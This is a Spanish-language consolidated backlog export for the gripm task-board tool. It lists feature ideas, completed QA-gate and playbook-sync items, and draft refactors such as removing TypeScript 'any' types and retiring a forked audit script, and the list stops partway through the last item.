# Backlog: gripm
> Consolidado generado el 2026-10-23 por gripm

## Resumen de Estados

### 💡 Ideas / Discovery (10)

#### [DEV-061] Monitoreo y Telemetría de Agent Skills: Métricas de Uso, Frecuencia, Última Invocación y Auditoría
- **Prioridad**: `low` | **Tipo**: `feature`

Módulo de observabilidad, estadísticas y diagnóstico para el ecosistema de Agent Skills (`.agents/skills/`):
1. **Telemetría de Skills:** Monitorear de forma local y no invasiva la interacción de agentes de IA con las skills del proyecto:
   - Cuándo fue la última invocación o lectura de cada `SKILL.md`.
   - Contador acumulado de accesos / usos por proyecto.
   - Duración o pasos asociados si aplica.
2. **Métricas y Diagnóstico de Salud:** Proveer un panel visual dentro de Ajustes o Diagnóstico que permita:
   - Detectar qué skills son las más utilizadas y críticas para el flujo de trabajo.
   - Identificar skills inactivas, desactualizadas o nunca utilizadas para sugerir su depuración, actualización o archivado.
3. **Persistencia Segura:** Registro de telemetría en `.devboard/skills-telemetry.json` (aislado y con actualización silenciosa sin interferir con Git ni ensuciar diffs de código).

**Criterios de Aceptación:**
- [ ] #1 Registro no invasivo de accesos a skills (fecha/hora de última invocación y conteo) en .devboard/skills-telemetry.json
- [ ] #2 Panel visual de métricas de Agent Skills en SettingsView o vista de Diagnóstico
- [ ] #3 Tabla con listado de skills, última invocación y frecuencia de uso
- [ ] #4 Sugerencias automáticas de depuración para skills obsoletas o nunca consultadas
- [ ] #5 Integración opcional con comando CLI npm run skills --stats

---

#### [DEV-178] Previsibilidad de Puerto y Evitación de Saltos Innecesarios en Servidor Dev y CLI
- **Prioridad**: `low` | **Tipo**: `improvement`

Investigar y definir mecanismos para evitar que el servidor de desarrollo (`npm run dev`) y el CLI (`npm run board`) cambien inesperadamente de puerto (ej. saltando de 4100 a 4101 o 4102) durante una misma sesión de trabajo o ante reinicios de servidor.

**Problemas detectados:**
1. **Reinicio de servidor Vite (*Server Restart*):** `vite.config.ts` importa utilidades de backend/parsers (`scripts/backlogMdParser.ts`, `src/utils/legacyParser.ts`, etc.). Modificar estos módulos provoca un reinicio completo del servidor Vite (`server.restart()`). Si el socket anterior en macOS aún está cerrándose (estado `TIME_WAIT`), `findAvailablePort` detecta el puerto 4100 como ocupado y migra automáticamente a 4101.
2. **Política `strictPort: false`:** La configuración actual incrementa silenciosamente el puerto ante cualquier colisión o demora transitoria de bind, rompiendo la pestaña que el desarrollador tiene abierta en el navegador.
3. **Doble resolución redundante:** En `npm run board`, `bin/gripm.js` ejecuta `findAvailablePort(4100)` con binds temporales y luego `vite.config.ts` vuelve a invocar `findAvailablePort(4100)` antes del `server.listen()` definitivo, generando ráfagas de sockets de sondeo.

**Vías de solución a evaluar:**
- Evaluar `strictPort: true` con mensajes claros de diagnóstico para que el servidor falle explícitamente en lugar de cambiar de URL de forma silenciosa.
- Desacoplar `vite.config.ts` de dependencias de parsers para aislar el HMR de la UI y no disparar reinicios globales del servidor HTTP.
- Sincronizar el puerto resuelto en `bin/gripm.js` exportando `process.env.GRIPM_PORT` para evitar doble invocación de `findAvailablePort`.
- Reintento con backoff breve antes de declarar un puerto ocupado en reinicios calientes de Vite.

**Criterios de Aceptación:**
- [ ] #1 Evaluar tradeoff entre strictPort: true (fallo explícito y diagnóstico) vs strictPort: false (salto automático)
- [ ] #2 Evitar doble sondeo de puertos sincronizando el puerto entre bin/gripm.js y vite.config.ts vía process.env.GRIPM_PORT
- [ ] #3 Analizar desacoplamiento de imports de scripts en vite.config.ts para reducir disparadores de server restart completo
- [ ] #4 Preservar compatibilidad con configuración multi-puerto explícita (--port y GRIPM_PORT)

---

#### [DEV-205] Evaluar e implementar Gripm Suite
- **Prioridad**: `medium` | **Tipo**: `feature`

Evaluar y, si la experiencia de usuario lo justifica, crear una forma sencilla de instalar Gripm Board y Gripm Playbook juntos desde una sola invocación, preservando que cada producto se pueda instalar, actualizar, usar y desinstalar independientemente.

No asumir que un paquete agregador de npm instala automáticamente los ejecutables de sus dependencias ni que una instalación conjunta debe ser global. Definir primero el alcance global y/o por proyecto, la selección de productos, los requisitos de Node y el comportamiento de actualización/desinstalación. Las operaciones deben preservar el backlog y los archivos existentes del usuario y solicitar confirmación explícita antes de cualquier acción destructiva.

Esta iniciativa depende de DEV-204 para que el modelo de productos, los nombres y los comandos individuales estén claros antes de introducir otra capa de instalación.

**Criterios de Aceptación:**
- [ ] #1 Está justificado el valor de Suite frente a instalar Board y Playbook por separado.
- [ ] #2 Se define y documenta qué productos incluye Suite y cómo se seleccionan, manteniendo Board y Playbook opcionales e independientes.
- [ ] #3 Se decide y documenta el alcance de instalación (global, por proyecto o ambos), los defaults y los comandos reproducibles.
- [ ] #4 Se valida con los artefactos empaquetados/publicados que una invocación instala los ejecutables previstos y no depende de suposiciones sobre npm.
- [ ] #5 Instalar, actualizar y desinstalar preserva backlogs y archivos del usuario; cualquier eliminación requiere consentimiento explícito.

---

#### [DEV-207] Mejorar UX responsive del tablero en tablet y mobile
- **Prioridad**: `medium` | **Tipo**: `improvement`

El tablero está priorizando actualmente el uso en desktop y presenta una experiencia visual apretada en tablet y mobile: controles de filtros densos, textos y estadísticas que compiten por espacio y vistas de trabajo que necesitan una jerarquía específica para pantallas táctiles. Diseñar una experiencia responsive intencional para resoluciones menores, sin limitarse a envolver controles en filas que dejen espacios vacíos o creen barras visualmente fragmentadas.

Este ítem es una **idea a refinar**, no un bug detectado. Requiere un trabajo de análisis, diseño y definición completa de la experiencia antes de poder implementarse; por eso sigue en `ideas` y no en `draft`.

**Criterios de Aceptación:**
- [ ] #1 Definir y documentar los anchos objetivo y la jerarquía de información para mobile, tablet y desktop
- [ ] #2 Reorganizar filtros, estadísticas y acciones del tablero para evitar hacinamiento y saltos de línea accidentales
- [ ] #3 Validar las vistas Kanban y Backlog en anchos táctiles habituales, incluyendo navegación, acciones y scroll
- [ ] #4 Mantener la experiencia desktop compacta y sin regresiones en resoluciones amplias
- [ ] #5 Verificar ambos idiomas y temas, sin overflow horizontal accidental ni pérdida de controles

---

#### [DEV-327] Vista Hoy con vencidas y próximas para uso diario
- **Prioridad**: `medium` | **Tipo**: `feature`

El modelo de datos ya persiste `dueDate` y `startDate` en el frontmatter de las tareas (`src/types.ts`), pero no existe ninguna lente que responda "¿qué debo atender hoy?". OpenTodo triunfa porque su pantalla principal agrupa vencidas, vencen hoy y próximas; gripm exige al usuario recorrer el Kanban o filtrar a mano para llegar a la misma información.

Explorar una pestaña "Hoy" (junto a Board, Sprints, Releases y Trash) que consulte las tareas por `dueDate` sin duplicar datos: la fuente sigue siendo el frontmatter o el JSON del backlog. La vista debe respetar los módulos habilitados en `.gripm/config.json` y no introducir estado persistido propio fuera de la configuración del proyecto.

Es una iniciativa de descubrimiento: antes de implementar, definir el agrupamiento exacto (vencidas, hoy, esta semana), el comportamiento con tareas sin fecha y si suma time-blocking sobre el `startDate` existente o se mantiene como lista simple.

**Criterios de Aceptación:**
- [ ] #1 Se documenta el alcance de la vista Hoy (agrupamiento, orden, tareas sin fecha) antes de implementar.
- [ ] #2 La vista se alimenta exclusivamente de `dueDate`/`startDate` ya persistidos, sin crear un segundo store de fechas.
- [ ] #3 La pestaña se integra al patrón de módulos existente y se puede deshabilitar desde `.gripm/config.json`.
- [ ] #4 Las tareas sin fecha no desaparecen del resto de vistas ni generan errores de render en la vista Hoy.
- [ ] #5 Los atajos de teclado y el cheat sheet (`?`) quedan actualizados si la vista agrega navegación nueva.

---

#### [DEV-328] Quick add en lenguaje natural para tareas
- **Prioridad**: `medium` | **Tipo**: `feature`

Crear una tarea hoy exige abrir el modal y completar campos a mano. OpenTodo ofrece captura en lenguaje natural ("fix login friday p1") que interpreta fecha, prioridad y proyecto. gripm puede ofrecer lo mismo con un parser propio y determinístico, sin llamadas a LLM y sin salir de la máquina, manteniendo la esencia local-first.

La captura debe mapear a campos ya existentes del frontmatter: `title`, `dueDate`, `priority`, `type` y `labels`. La interpretación debe ser conservadora: si un fragmento no se reconoce con certeza, va al título completo en lugar de inventar metadatos. El resultado debe ser una tarea normal que pasa por `backlog:sync` y el gatekeeper del MCP igual que cualquier otra.

Es una iniciativa de descubrimiento: evaluar si el parser se resuelve en el modal del board, en el CLI o como función compartida por ambos, antes de decidir dónde se implementa.

**Criterios de Aceptación:**
- [ ] #1 Se define y documenta la sintaxis soportada (fecha, prioridad, tipo, etiquetas) con ejemplos y contraejemplos.
- [ ] #2 La interpretación es determinística y sin red: los fragmentos no reconocidos se conservan literalmente en el título.
- [ ] #3 Las tareas creadas por quick add son indistinguibles de las creadas por el modal en frontmatter y en `backlog:sync`.
- [ ] #4 Existe al menos un test que cubra la interpretación de fechas y prioridades, incluido el caso ambiguo.
- [ ] #5 El quick add no permite saltar el gatekeeper ni crear estados prohibidos por el MCP.

---

#### [DEV-329] Captura rápida desde CLI sin abrir el board
- **Prioridad**: `medium` | **Tipo**: `feature`

Hoy un humano que quiere registrar una tarea debe abrir el board en el browser o recurrir al MCP (que está pensado para agentes). OpenTodo expone `ot add "Call the plumber" --due tomorrow --priority 2` como binario separado. gripm ya distribuye el binario `gripm`, así que el camino natural es un subcomando de captura que escriba directamente en el storage del proyecto (`backlog/tasks/*.md` o `.gripm/backlog.json`).

La escritura debe reutilizar el mismo motor de persistencia que el board y el MCP para que el resultado pase por `backlog:check` y `backlog:sync` sin divergencias. El comando debe respetar el engine de storage configurado del proyecto y fallar con mensaje claro si no hay proyecto inicializado.

Es una iniciativa de descubrimiento: definir el contrato del comando (flags, salida, manejo de errores) antes de implementar, y evaluar si convive con un quick add en lenguaje natural (DEV-328) o lo precede.

**Criterios de Aceptación:**
- [ ] #1 `gripm add` crea una tarea en el engine de storage activo del proyecto usando el mismo camino de escritura que el board.
- [ ] #2 La tarea resultante pasa `npm run backlog:check` sin correcciones posteriores.
- [ ] #3 El comando falla con mensaje accionable cuando el directorio no es un proyecto gripm inicializado.
- [ ] #4 Los flags documentados (título, fecha, prioridad, tipo) tienen cobertura de test o verificación ejecutable.
- [ ] #5 El uso queda documentado junto al resto de flags CLI del README.

---

#### [DEV-330] Badges y notificaciones locales de vencimiento
- **Prioridad**: `medium` | **Tipo**: `feature`

OpenTodo envía recordatorios vía Web Push, lo que exige servidor persistente, claves VAPID y un servicio de push de terceros. gripm no necesita nada de eso: su servidor corre en la máquina del usuario, así que con la Notifications API del navegador y un contador en la pestaña puede ofrecer el mismo valor ("3 tareas vencidas") sin que un solo byte salga de la máquina.

Explorar un badge en el tab del board y notificaciones locales opcionales para tareas que vencen hoy o están vencidas, alimentados por el mismo `dueDate` que ya existe. La funcionalidad debe ser opt-in, con permiso del navegador solicitado en contexto, y desactivable desde configuración. Depende de la definición de la vista Hoy (DEV-327) porque comparte la misma lógica de agrupamiento por fecha.

Es una iniciativa de descubrimiento: verificar primero que la ventana local tenga oportunidad real de mostrarse (el board no siempre está abierto) para no prometer recordatorios que no se disparan.

**Criterios de Aceptación:**
- [ ] #1 Se documenta cuándo pueden dispararse las notificaciones dado que el board solo corre con el servidor local abierto.
- [ ] #2 No se realiza ninguna petición de red hacia servicios de push externos ni se introduce dependencia de terceros.
- [ ] #3 El badge y las notificaciones son opt-in y se pueden desactivar desde la configuración del proyecto.
- [ ] #4 El conteo usa `dueDate` existente y coincide con el agrupamiento de la vista Hoy (DEV-327).
- [ ] #5 Con permiso denegado o navegador sin soporte, la app degrada sin errores en consola.

---

#### [DEV-331] Vistas guardadas y filtros persistidos en config
- **Prioridad**: `medium` | **Tipo**: `feature`

Los filtros del board son efímeros: al recargar se pierden y el usuario debe reconstruirlos. OpenTodo ofrece vistas guardadas persistidas. gripm puede persistirlas en `.gripm/config.json`, lo que además las hace versionables con Git y editables por un agente vía MCP sin UI adicional.

Explorar el modelo: qué dimensiones guarda una vista guardada (estado, prioridad, etiqueta, prefijo, sprint, release) y si se definen por proyecto o de forma global en `~/.gripm/`. Debe respetar la semántica de filtros existente (estados activos vs todos los estados) y la ortogonalidad de dimensiones del modelo de datos.

Es una iniciativa de descubrimiento: definir primero el esquema de una vista guardada y su compatibilidad hacia atrás con `.gripm/config.json` actual antes de tocar la UI.

**Criterios de Aceptación:**
- [ ] #1 Se define el esquema de una vista guardada y se valida contra el parser actual de `.gripm/config.json` sin romper configuraciones existentes.
- [ ] #2 Las vistas persistidas respetan la semántica de filtros vigente (estados activos vs todos los estados).
- [ ] #3 Una vista guardada definida en config es visible y utilizable en el board sin pasos manuales extra.
- [ ] #4 Un agente puede crear o modificar vistas vía MCP o edición de config y el board las refleja.
- [ ] #5 La documentación de `.gripm/config.json` queda actualizada con el nuevo esquema.

---

#### [DEV-332] Importación de backlogs desde herramientas externas
- **Prioridad**: `low` | **Tipo**: `feature`

Migrar a gripm desde otra herramienta hoy exige reescribir tareas a mano. OpenTodo destaca por su importador de JSON, CSV y exports de otras apps. gripm puede importar con dos caminos de bajo riesgo: la convención de archivos de Backlog.md (que ya sigue en `backlog/tasks/*.md`) y un formato tabular o JSON genérico.

La restricción crítica es la integridad: una importación no puede fabricar criterios de aceptación ni estados certificados (regla SEC-02). Las tareas importadas deben nacer en estado inicial (`draft` o `ideas`) sin ACs tildadas, y el resultado debe pasar `backlog:sync` y `backlog:check` limpios. El importador debe ser transaccional: o escribe todo o no escribe nada.

Es una iniciativa de descubrimiento: elegir primero el formato de origen de mayor demanda y validar el contrato antes de implementar múltiples importadores.

**Criterios de Aceptación:**
- [ ] #1 Se elige y documenta el formato de origen prioritario con un ejemplo real de importación.
- [ ] #2 Toda tarea importada nace en estado inicial sin criterios marcados y sin transgredir SEC-02.
- [ ] #3 El proceso es transaccional: una importación interrumpida no deja el backlog a medias.
- [ ] #4 El resultado pasa `npm run backlog:sync` y `npm run backlog:check` con código 0.
- [ ] #5 Duplicados y conflictos de ID se detectan y reportan antes de escribir, sin sobrescribir tareas existentes.

---

### 🚀 Ready for Deploy (3)

#### [DEV-323] Adopción y sincronización del Playbook Golden en gripm
- **Prioridad**: `high` | **Tipo**: `tech_debt`

Adoptar en gripm el core estandarizado de `@gripm/playbook@2.6.0` y alinear todas las referencias a los nombres de rol renombrados (`worldclass-product-designer` -> `product-designer`, `rigorous-qa-auditor` -> `qa-auditor`).

**Solo lado consumidor.** El framework esta terminado y certificado (PLAY-029, PLAY-030). Fuera de alcance: editar `gripm-playbook`, refactor editorial, traduccion de archivos del playbook, scripts one-off, y editar tareas historicas (`backlog/tasks/`, `docs/archive/`) que mencionan los nombres viejos.

### Gates, abiertos a 2026-10-21

- **Release**: tag remoto `v2.6.0` (`631df3c`) y npm `latest: 2.6.0`. El manifest del tag trae `product-designer` y `qa-auditor` en `core` y `coreSkills`.
- **Lease antigravity**: `PLAY-026/027/028` en `done`, liberado por el PO.
- **Ref del sync**: fijado explicitamente con `--tag v2.6.0`.

### Alcance tecnico

`scripts/sync-playbook.mjs` se auto-actualiza: el manifest de `v2.6.0` lo mete en `core`, el blob de gripm (`f4082e41`, 699 lineas) si existe en la historia upstream (commit `e5c8279`), y al no estar en `lock.files` la clasificacion arranca en `unknown` -> `findCanonicalProvenance` devuelve `canonical` -> el sync lo actualiza hacia adelante a la version modularizada (496 lineas). No hay que editar `FALLBACK_CORE_FILES` a mano. La version nueva importa `./lib/{terminal,provenance,sync-classifier}.mjs`, las tres en `core`, y su CLI es compatible con `playbook:check` y `playbook:sync`.

`scripts/verify-publish-surface.js` si hay que editarlo a mano (lineas 54 y 56): es especifico del consumidor, no existe upstream.

`scripts/audit-ux-code.cjs` **no** se toca: el lockfile lo registra en `customizations` (fork DEV-166) y `classifyLocalFile` lo devuelve `customization` por el lockfile antes de evaluar nada mas. El fork sobrevive al sync. Su retiro es labor de DEV-188.

**Criterios de Aceptación:**
- [x] #1 `npm run playbook:sync -- --tag v2.6.0 --yes` corre con exito y `.playbook-lock.json` queda con `ref: v2.6.0` y las rutas `product-designer` / `qa-auditor` en `files`.
- [x] #2 El tarball npm no contiene archivos del framework del playbook (DEV-250). `npm run publish:check` con exit 0.
- [x] #3 Los directorios `.agents/skills/worldclass-product-designer/` y `.agents/skills/rigorous-qa-auditor/` no existen, y los directorios `product-designer/` y `qa-auditor/` si.
- [x] #4 `scripts/verify-publish-surface.js` referencia `product-designer` y `qa-auditor` en `FORBIDDEN_PLAYBOOK_ENTRIES`, y no quedan referencias a los nombres viejos en `scripts/`, `AGENTS.md`, `README.md` ni `README.es.md` (excluyendo `backlog/tasks/` y `docs/archive/`, que son historicos).
- [x] #5 `scripts/scan-markdown-hygiene.mjs` no existe.
- [x] #6 Piramide completa en verde: `npx tsc --noEmit`, `npm test`, `npm run test:linux`, `npm run backlog:sync && npm run backlog:check`, `npm run publish:check`, `npm run build`, `node scripts/verify-changes.js --all`.
- [x] #7 Seccion desactualizada de `DEV-188` corregida: la advertencia que afirma que la divergencia de `audit-ux-code.cjs` quedo en cero desde v1.0.3 y que el archivo es byte a byte identico al tarball queda reemplazada por la medicion real, mas el hecho de que el fork sobrevive al sync.
- [x] #8 `scripts/verify-changes.js` distingue **mencion** de **uso** en el guardrail Anti-Em-Dash, sin degradar la deteccion. `checkAntiEmDash` pasa la linea por `stripDashMentions` antes de medir.

---

#### [DEV-325] Declarar los scripts del contrato del QA gate para desbloquear la certificacion mecanica
- **Prioridad**: `high` | **Tipo**: `bug`

`scripts/gate-qa.mjs` nunca pudo salir con codigo 0 en este repositorio. El motivo no es un defecto del script: es un **contrato de nombres sin satisfacer**.

`qa-auditor/SKILL.md:69` lo declara textual:

> A blocking step (`validate`/`typecheck`, `test`, `spec`, `audit:ux`) that has no defined script **fails the gate**.

El gate lee el `package.json` del anfitrión y resuelve cada paso por nombre. El playbook declara esos nombres en su propio `package.json` (`validate`, `gate:review`, `audit:ux:strict`), pero **gripm nunca los declaro**. El contrato lo falto el consumidor, no el framework.

Verificado en el upstream `v2.6.0`: el mensaje de error que emite gripm (`blocking step has no "validate" script in package.json; it cannot be certified on a step that never ran`) es identico carácter a carácter al de `scripts/lib/pyramid.mjs`. La logica del fork esta preservada. Ademas upstream ya preve anfitriones con otros nombres via `fallbackScripts: ['typecheck']`.

Consecuencia del contrato insatisfecho: tres de cinco pasos son `blocking: true` y quedan `failed`, asi que el gate **no ha podido certificar ningun item** en la historia del repo. Los 293 `done` llegaron ahi sin certificacion mecanica.

La correccion va en `package.json`, no en `gate-qa.mjs`. Editar el gate profundizaria un fork cuya unica razon de existir es cosmética (DEV-320 AC #3: encabezado abierto y glifos mono-ancho) y cerraria gripm a cualquier fix futuro del upstream.

**Criterios de Aceptación:**
- [x] #1 `package.json` define los tres scripts del contrato del gate: `validate`, `gate:review` y `audit:ux:strict`.
- [x] #2 Los tres delegan en los scripts primarios existentes (`verify:changes`, `backlog:check`, `audit:ux`) sin duplicar el comando, para que la fuente unica de verdad siga siendo el script primario.
- [x] #3 `validate` pasa `--all`, de modo que el paso verifique el arbol completo y no pueda certificar un pase vacio cuando nada esta stageado.
- [x] #4 `node scripts/gate-qa.mjs DEV-325` ejecuta los cinco pasos de la pirámide y ninguno reporta `has no "..." script in package.json`.
- [x] #5 `scripts/gate-qa.mjs` no fue modificado: su SHA-256 sigue coincidiendo con el registrado en `.playbook-lock.json`.
- [x] #6 `npm run audit:ux:strict` sale con codigo 0.
- [x] #7 `npm run validate` sale con codigo 0 verificando el arbol completo.
- [x] #8 `npm run backlog:sync` y `npm run backlog:check` salen con codigo 0.
- [x] #9 `node scripts/verify-changes.js --all` sale con codigo 0.

---

#### [DEV-326] Retirar la customizacion de gate-qa.mjs y adoptar el gate canonico v2.6.0
- **Prioridad**: `high` | **Tipo**: `chore`

`scripts/gate-qa.mjs` esta declarado como customizacion en `.playlock.json` por una razon que ya no existe. DEV-320 AC #3 lo marco para preservar sus mejoras de salida (encabezado abierto, glifos mono-ancho, eliminacion de cajas rigidas). Verificado caracter a caracter contra upstream `v2.6.0`, esas mejoras **ya estan en el canon**: `printHeader` y la paleta `c` son identicas, el bloque `Task:/ID:/Status:` es identico, los glifos `✖ ✔ ℹ ➜` son identicos y upstream tambien elimino las cajas `---`. Incluso mejora el original: su `isColorSupported` acepta cualquier `FORCE_COLOR` truthy, no solo `'1'`.

Lo que el fork si diverge no es cosmético, es funcional, y en tres ejes:

1. **No escribe nunca.** El fork no contiene `writeFileSync` ni `mutateTaskFrontmatter` en ningun camino. El canon escribe `status: ready` en T2, escribe status y limpia `blocked_reason` en T_unblock. El fork solo certifica y dice "may be promoted".
2. **No implementa T0 ni T1.** `startMain` y `submitMain` no existen. Ejecutado: `node scripts/gate-qa.mjs start DEV-325` responde `no task found for "start"`, porque toma la palabra como identificador de tarea.
3. **No soporta `--by`.** `pm-orchestrator/SKILL.md:87` ordena `--by "<provider>:<id>"`; el canon lo acepta (`--by`, `--as`, `--to`), el fork no.

Las skills instaladas por DEV-323 (`qa-auditor/SKILL.md:52-53`, `pm-orchestrator/SKILL.md:22,87,90`) documentan el comportamiento del canon. Skills y herramienta quedaron fuera de sincronia porque el sync actualizo los primeros y protegio el segundo.

Con el fork vivo, T2 no puede completarse por via mecanica: aunque todo este verde y el gate salga en 0, alguien tiene que escribir `ready` a mano. Eso explica por que los 293 `done` tuvieron que moverse a mano.

**Criterios de Aceptación:**
- [x] #1 `scripts/gate-qa.mjs` coincide byte a byte con el blob upstream `v2.6.0` (SHA-256 identico).
- [x] #2 `.playbook-lock.json` ya no lista `scripts/gate-qa.mjs` en `customizations`.
- [x] #3 `customizations` queda reducida exclusivamente a `scripts/audit-ux-code.cjs`.
- [x] #4 `scripts/lib/frontmatter.mjs`, `scripts/lib/terminal.mjs` y `scripts/lib/pyramid.mjs` siguen presentes, porque el gate canonico los importa.
- [x] #5 `node scripts/gate-qa.mjs DEV-326` sale con codigo 0, reporta los cinco pasos y escribe `status: ready` en el archivo de la tarea.
- [x] #6 `node scripts/gate-qa.mjs start <ID>` reconoce `start` como transicion T0 y no como identificador de tarea.
- [x] #7 `npx tsc --noEmit` sale con 0 errores y `node scripts/verify-changes.js --all` sale con codigo 0.
- [x] #8 `npm run backlog:sync` y `npm run backlog:check` salen con codigo 0.
- [x] #9 `npm run publish:check` sale con codigo 0.

---

### 📋 Backlog / Draft (21)

#### [DEV-039] Sincronización no invasiva de árbol Git con estados de backlog y releases
- **Prioridad**: `low` | **Tipo**: `feature`

Inspección de solo lectura del árbol Git local (commits, ramas, tags) para correlacionar tareas y releases sin alterar el repositorio ni requerir permisos especiales. Modo sugerencia asistida.

**Criterios de Aceptación:**
- [ ] #1 Lector pasivo de Git usando child_process.execFile con sanitización estricta y timeout
- [ ] #2 Mapeo de tags de release semánticos a entidades Release de DevBoard
- [ ] #3 Detección de commits asociados a tareas mediante regex sobre mensajes de commit
- [ ] #4 Indicador de estado Git no invasivo en la UI (asistente de sugerencias, sin mutación forzada)
- [ ] #5 Garantía estricta de cero comandos de escritura de Git en cumplimiento con .agents/rules/git-approval.md

---

#### [DEV-057] Centro de Gestión de Releases: Inspección de Release Notes, Conjunto de Cards y Sincronización con Git
- **Prioridad**: `low` | **Tipo**: `feature`

Evolución integral del módulo de Releases hacia un centro de control y auditoría de entregas:
1. **Inspección de Releases:** Permitir visualizar en la aplicación la lista completa de releases gestionados con DevBoard, incluyendo:
   - Resumen y notas de release generadas (Markdown renderizado con títulos, mejoras y fixes).
   - Tabla interactiva con el conjunto exacto de tarjetas asociadas a esa versión (con código, título, autor y estado).
2. **Sincronización Pasiva con Git (Dependencia DEV-039):**
   - Correlacionar los releases declarados en DevBoard con los tags y commits reales del repositorio Git local mediante la inspección no invasiva de DEV-039.
   - Detectar discrepancias (ej: un release con tareas marcadas como listas pero sin tag Git generado, o commits en la rama que hacen referencia a tareas aún abiertas).
3. **Exportación de Changelog:** Botones de copia rápida en Markdown y exportación para GitHub Releases o actualización de `CHANGELOG.md`.

**Criterios de Aceptación:**
- [ ] #1 Vista de detalle por release con notas de cambio completas en Markdown renderizado
- [ ] #2 Listado filtrable de todas las tarjetas asociadas a cada versión gestionada
- [ ] #3 Correlación y badge de coherencia con tags locales de Git proveniente de la integración DEV-039
- [ ] #4 Asistente para detectar discrepancias entre código tageado y tareas asociadas
- [ ] #5 Botón de copiado en un click del changelog formateado para GitHub Releases

---

#### [DEV-167] Erradicación de 52 any en src/ y Alineación Estricta con Skill Principal Engineer
- **Prioridad**: `low` | **Tipo**: `refactor`

En la base de código de `src/` persisten aproximadamente 52 a 55 anotaciones explícitas de tipo `any`, a pesar de que el compilador TypeScript opera con `"strict": true` y la directiva técnica `principal-engineer` exige tipado riguroso sin evasiones de linter.

### Diagnóstico de Causa Raíz

1. **Manejo de excepciones:** Más de 25 ocurrencias provienen del patrón `catch (err: any)` en `src/App.tsx`, `ReleaseAssembler.tsx`, `SettingsView.tsx` y diversos modales, donde luego se accede a `err.message`.
2. **Callbacks genéricos en vistas:** Parámetros como `retroData?: any` en `handleCompleteSprint` (`App.tsx`, `SprintView.tsx`) y `value: any` en `handleUpdateColumnField` (`SettingsView.tsx`) y `updateItemField` (`ImportWizardModal.tsx`).
3. **Manejadores de eventos y red:** Propiedades como `data: any`, `items?: any[]` y `(evt: any)` en `src/api.ts`.

### Problema

La presencia de `any` debilita el contrato de tipos en tiempo de compilación y contradice el guardrail de la skill `principal-engineer`, restándole credibilidad normativa al sistema de diseño y arquitectura.

### Objetivo

Refactorizar los tipos en `src/` para eliminar las anotaciones `any`:
- Migrar cláusulas de captura a `catch (err: unknown)` usando asistentes seguros de extracción de mensaje (ej. `getErrorMessage(err)`).
- Tipar formalmente `retroData` (interfaz `SprintRetroData`), payloads de Server-Sent Events y campos dinámicos de formularios.
- Lograr que `grep -rn --include="*.ts" --include="*.tsx" ": any" src/` devuelva cero ocurrencias.

**Criterios de Aceptación:**
- [ ] #1 Reemplazar `catch (err: any)` por `catch (err: unknown)` con validación defensiva en `src/App.tsx` y modales
- [ ] #2 Tipar estrictamente `retroData`, payloads SSE y firmas de actualización en `src/api.ts`, `SettingsView.tsx` y `SprintView.tsx`
- [ ] #3 `grep -rn --include="*.ts" --include="*.tsx" ": any" src/` retorna 0 coincidencias
- [ ] #4 `npx tsc --noEmit` compila limpiamente con 0 errores de tipado estricto
- [ ] #5 La suite unificada de tests `npm test` pasa íntegra con exit code 0

---

#### [DEV-180] Evaluación y Migración Arquitectónica de Dependencias Core a React 19 y Tooling Moderno
- **Prioridad**: `medium` | **Tipo**: `improvement`

Planificar y ejecutar la migración arquitectónica integral de las dependencias principales del stack hacia sus versiones mayores modernas (React 19, TypeScript moderno y plugins actualizados de Vite).

**Contexto del parche temporal:**
Durante el monitoreo automatizado de dependencias (DEV-175), Dependabot intentó actualizar automáticamente `react`/`react-dom` a v19.x y `typescript`/`@types/node` a versiones mayores. Esto provocó fallos en el pipeline de CI debido a incompatibilidades de tipos en `vite.config.ts` (TS2769: sobrecargas incompatibles de `@vitejs/plugin-react`) y diferencias en las definiciones de tipos de React 19. Para preservar la estabilidad de la rama `main` en producción, se aplicó una regla de contención en `.github/dependabot.yml` ignorando actualizaciones `semver-major`.

**Alcance de la resolución de fondo:**
1. **Auditoría de compatibilidad de React 19:**
   - Evaluar soporte y compatibilidad de `@vitejs/plugin-react`, `lucide-react` y Tailwind CSS con React 19.
   - Revisar tipado estricto en componentes (adaptar definiciones de `FC`, `ReactNode`, eventos sintéticos y ref handling nativo de React 19).
2. **Actualización de Vite y Tooling:**
   - Evaluar actualización coordinada de Vite (`vite` v6+) y sus plugins asociados.
   - Alinear `@types/react`, `@types/react-dom` y `@types/node` a las versiones meta.
3. **Validación de Rendimiento y Cero Regresiones:**
   - Comprobar compatibilidad con el sistema de portales (`createPortal` en `ConfirmModal` y menús contextuales).
   - Verificar estabilidad de renderizado en Kanban y vistas de tabla (Zero-CLS y 60 FPS).
4. **Desbloqueo de Dependabot:**
   - Retirar las reglas de `ignore` en `.github/dependabot.yml` una vez consolidado el nuevo baseline arquitectónico.

**Criterios de Aceptación:**
- [ ] #1 Auditar matriz de breaking changes de React 19 y compatibilidad con el catálogo de dependencias del proyecto
- [ ] #2 Actualizar react, react-dom, @types/react y @types/react-dom en package.json resolviendo contratos de tipos
- [ ] #3 Actualizar vite.config.ts y @vitejs/plugin-react garantizando compilación estricta (npx tsc --noEmit con 0 errores)
- [ ] #4 Verificar suite de pruebas completa (npm test), build de producción y empaquetado standalone (binarios bin/)
- [ ] #5 Remover los ignores de semver-major en .github/dependabot.yml para React y sus tipos

---

#### [DEV-188] Migración al motor de audit:ux upstream: fin del fork, baseline y pérdida de INVARIantes locales
- **Prioridad**: `high` | **Tipo**: `tech_debt`

Dar de baja el fork local de `scripts/audit-ux-code.cjs` y adoptar el motor de
`@gripm/playbook` como consumidora común. Es la última pieza de la deuda que dejó
DEV-166, que forkeó el motor para poder meter baselining antes de que existiera
upstream.

### Estado actual del fork (relevado 2026-10-21)

> [!WARNING]
> **Seccion reescrita el 2026-10-21.** La version previa de este bloque afirmaba que la
> divergencia "quedó en cero" desde v1.0.3 y que el archivo era "byte a byte identico al
> tarball". **Ambas afirmaciones son falsas.** El fork esta vivo y medido abajo. Lo que si
> quedo resuelto upstream es el bloque `hasVisibleText`, ver la seccion final de esta
> descripcion.

**`scripts/audit-ux-code.cjs` sigue bifurcado y el fork sobrevive a cualquier sync.**

Medicion de 2026-10-21, hash SHA-256 contra tags upstream:

| Version | Hash | Lineas |
| --- | --- | --- |
| gripm | `4B57DB30` | 1225 |
| upstream `v2.2.2` | `D5E2EDDE` | 1206 |
| upstream `v2.3.0` / `v2.4.0` | `9710E158` | 1289 |
| upstream `v2.5.0` / `v2.6.0` | `E3ADBF5D` | 1355 |

El blob de gripm **no coincide con ningun tag upstream**. Divergencia contra `v2.2.2`:

- **65 lineas** que solo existen en `gripm`
- **46 lineas** que solo existen en upstream

